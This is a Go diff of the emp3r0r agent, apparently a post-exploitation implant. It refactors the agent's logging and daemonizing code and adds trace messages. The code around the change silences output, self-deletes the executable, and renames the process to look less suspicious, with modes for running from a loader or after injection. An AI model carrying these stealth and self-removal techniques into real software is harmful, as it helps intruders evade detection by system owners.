@@ -34,19 +34,40 @@ func agent_main() {
 
 	// accept env vars
 	verbose := os.Getenv("VERBOSE") == "true"
+	if verbose {
+		log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
+		log_file := "emp3r0r.log"
+		f, err := os.OpenFile(log_file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
+		if err != nil {
+			log.Fatalf("[-] Cannot open %s: %v", log_file, err)
+		}
+		defer f.Close()
+		log.SetOutput(f)
+		log.Println("emp3r0r agent has started")
+	} else {
+		log.SetOutput(io.Discard)
+		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
+		if err != nil {
+			log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
+		}
+		defer null_file.Close()
+		os.Stderr = null_file
+		os.Stdout = null_file
+	}
+
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
 	// self delete or not
 	persistence := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
 	is_dll := os.Getenv("LD") == "true"
 
-	setupLogging(verbose)
 	do_not_touch_argv := is_dll || is_injected
 	renameProcessIfNeeded(persistence, do_not_touch_argv)
-	daemonizeIfNeeded(verbose, is_dll)
+	exe_path := util.ProcExePath(os.Getpid())
+	daemonizeIfNeeded(verbose, is_dll, exe_path)
 
 	// self delete
-	self_delete := !is_dll && !is_injected && !persistence
+	self_delete := !is_dll && !is_injected && !persistence && runtime.GOOS == "linux"
 	if self_delete {
 		err = deleteCurrentExecutable()
 		if err != nil {
@@ -55,6 +76,7 @@ func agent_main() {
 	}
 
 	// applyRuntimeConfig
+	log.Println("Applying runtime config...")
 	err = agent.ApplyRuntimeConfig()
 	if err != nil {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
@@ -301,34 +323,13 @@ connect:
 	goto connect
 }
 
-func setupLogging(verbose bool) {
-	if verbose {
-		log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
-		log_file := "emp3r0r.log"
-		f, err := os.OpenFile(log_file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
-		if err != nil {
-			log.Fatalf("[-] Cannot open %s: %v", log_file, err)
-		}
-		defer f.Close()
-		log.SetOutput(f)
-		log.Println("emp3r0r agent has started")
-	} else {
-		log.SetOutput(io.Discard)
-		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
-		if err != nil {
-			log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
-		}
-		defer null_file.Close()
-		os.Stderr = null_file
-		os.Stdout = null_file
-	}
-}
-
-func daemonizeIfNeeded(verbose, run_from_loader bool) {
-	if runtime.GOOS == "linux" && !verbose && os.Getenv("DAEMON") != "true" && !run_from_loader {
+func daemonizeIfNeeded(verbose, is_shared_lib bool, exe_path string) {
+	log.Println("daemonizeIfNeeded...")
+	if runtime.GOOS == "linux" && !verbose && os.Getenv("DAEMON") != "true" && !is_shared_lib {
 		log.Println("Daemonizing...")
 		os.Setenv("DAEMON", "true")
-		cmd := exec.Command(os.Args[0])
+		cmd := exec.Command(exe_path)
+		cmd.Env = os.Environ()
 		err := cmd.Start()
 		if err != nil {
 			log.Fatalf("Daemonize: %v", err)
@@ -338,6 +339,7 @@ func daemonizeIfNeeded(verbose, run_from_loader bool) {
 }
 
 func renameProcessIfNeeded(persistent, do_not_touch_argv bool) {
+	log.Println("renameProcessIfNeeded...")
 	if !persistent && !do_not_touch_argv && runtime.GOOS == "linux" {
 		log.Println("Renaming process...")
 		// rename our agent process to make it less suspecious
@@ -349,6 +351,7 @@ func renameProcessIfNeeded(persistent, do_not_touch_argv bool) {
 }
 
 func setupEnvironment() {
+	log.Println("setupEnvironment...")
 	u, err := user.Current()
 	if err != nil {
 		log.Printf("Get user info: %v", err)
@@ -367,6 +370,7 @@ func setupEnvironment() {
 }
 
 func cleanUpDownloadingFiles() {
+	log.Println("cleanUpDownloadingFiles...")
 	err := filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
 		if err == nil && strings.HasSuffix(info.Name(), ".downloading") {
 			os.RemoveAll(path)
@@ -379,6 +383,7 @@ func cleanUpDownloadingFiles() {
 }
 
 func deleteCurrentExecutable() error {
+	log.Println("deleteCurrentExecutable...")
 	selfPath, err := os.Executable()
 	if err != nil {
 		return fmt.Errorf("failed to get executable path: %v", err)
